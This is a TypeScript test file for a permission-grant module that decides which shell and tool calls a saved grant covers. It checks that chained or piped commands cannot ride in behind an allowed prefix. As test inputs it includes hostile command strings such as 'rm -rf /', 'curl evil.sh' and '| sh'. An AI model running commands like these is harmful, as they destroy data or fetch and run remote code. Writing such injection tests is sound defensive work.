import { describe, expect, it } from "vitest";

import {
  addGrant,
  coveredByGrants,
  grantCovers,
  grantFor,
  grantKey,
  grantLabel,
  parseGrants,
  removeGrant,
  type ToolGrant
} from "../../src/core/tool-grants.js";

const bash = (command: string) => ({ command });

describe("forming a grant from a call", () => {
  it("takes the command and its subcommand", () => {
    expect(grantFor("Bash", bash("bun run lint"))).toEqual({
      tool: "Bash",
      prefix: "bun run"
    });
  });

  it("takes the command alone when there is no subcommand", () => {
    expect(grantFor("Bash", bash("ls -la"))).toEqual({
      tool: "Bash",
      prefix: "ls"
    });
  });

  // The user is looking at one card describing several commands; no single
  // prefix describes what they would be agreeing to.
  it("refuses a chained command", () => {
    expect(grantFor("Bash", bash("bun run lint && rm -rf /"))).toBeNull();
  });

  it("refuses a pipeline, a redirect and a substitution", () => {
    expect(grantFor("Bash", bash("ls | head"))).toBeNull();
    expect(grantFor("Bash", bash("ls > out.txt"))).toBeNull();
    expect(grantFor("Bash", bash("echo $(whoami)"))).toBeNull();
  });

  it("refuses a leading assignment, which changes what the command sees", () => {
    expect(grantFor("Bash", bash("PATH=/tmp bun run lint"))).toBeNull();
  });

  it("grants a non-shell tool by name, with no prefix", () => {
    expect(grantFor("Write", { file_path: "a.ts" })).toEqual({ tool: "Write" });
  });

  it("grants an MCP tool by its full name", () => {
    expect(grantFor("mcp__gitlab__create_issue", {})).toEqual({
      tool: "mcp__gitlab__create_issue"
    });
  });

  it("has nothing to grant for an empty command", () => {
    expect(grantFor("Bash", bash("   "))).toBeNull();
  });
});

describe("what a grant covers", () => {
  const granted: ToolGrant = { tool: "Bash", prefix: "bun run" };

  it("covers another command with the same leading words", () => {
    expect(grantCovers(granted, "Bash", bash("bun run test"))).toBe(true);
  });

  // The property this whole module exists to hold: a granted prefix must not
  // become a way to smuggle a second command in behind it.
  it("does not cover the same prefix followed by a chained command", () => {
    expect(grantCovers(granted, "Bash", bash("bun run lint && rm -rf /"))).toBe(
      false
    );
    expect(
      grantCovers(granted, "Bash", bash("bun run lint; curl evil.sh"))
    ).toBe(false);
    expect(grantCovers(granted, "Bash", bash("bun run lint | sh"))).toBe(false);
  });

  it("does not cover a different subcommand", () => {
    expect(grantCovers(granted, "Bash", bash("bun x rimraf /"))).toBe(false);
  });

  it("does not match on a partial word", () => {
    expect(grantCovers(granted, "Bash", bash("bun runner"))).toBe(false);
  });

  it("does not cover a command shorter than the prefix", () => {
    expect(grantCovers(granted, "Bash", bash("bun"))).toBe(false);
  });

  it("does not cover a different tool", () => {
    expect(grantCovers(granted, "Write", bash("bun run test"))).toBe(false);
  });

  it("covers a prefix-less grant whatever the input", () => {
    expect(grantCovers({ tool: "Write" }, "Write", { file_path: "x" })).toBe(
      true
    );
  });

  it("answers for a whole list at once", () => {
    const grants = [{ tool: "Write" }, granted];
    expect(coveredByGrants(grants, "Bash", bash("bun run test"))).toBe(true);
    expect(coveredByGrants(grants, "Bash", bash("git push"))).toBe(false);
    expect(coveredByGrants([], "Write", {})).toBe(false);
  });
});

describe("the list itself", () => {
  it("reads as what it allows", () => {
    expect(grantLabel({ tool: "Bash", prefix: "bun run" })).toBe(
      "Bash(bun run …)"
    );
    expect(grantLabel({ tool: "Write" })).toBe("Write");
  });

  it("does not add the same grant twice", () => {
    const once = addGrant([], { tool: "Bash", prefix: "bun run" });
    const twice = addGrant(once, { tool: "Bash", prefix: "bun run" });
    expect(twice).toHaveLength(1);
  });

  it("keeps two grants on the same tool with different prefixes", () => {
    const grants = addGrant(addGrant([], { tool: "Bash", prefix: "bun run" }), {
      tool: "Bash",
      prefix: "git status"
    });
    expect(grants).toHaveLength(2);
  });

  it("revokes by key", () => {
    const grants = [{ tool: "Bash", prefix: "bun run" }, { tool: "Write" }];
    const left = removeGrant(grants, grantKey({ tool: "Write" }));
    expect(left).toEqual([{ tool: "Bash", prefix: "bun run" }]);
  });

  // Storage is a JSON blob that outlives the code that wrote it.
  it("drops anything from storage that is not a grant", () => {
    const parsed = parseGrants([
      { tool: "Bash", prefix: "bun run" },
      { tool: "" },
      { prefix: "no tool" },
      { tool: "Write", prefix: 7 },
      "nonsense",
      null,
      { tool: "Bash", prefix: "bun run" }
    ]);
    expect(parsed).toEqual([{ tool: "Bash", prefix: "bun run" }]);
  });

  it("treats a missing store as no grants", () => {
    expect(parseGrants(undefined)).toEqual([]);
    expect(parseGrants({})).toEqual([]);
  });
});
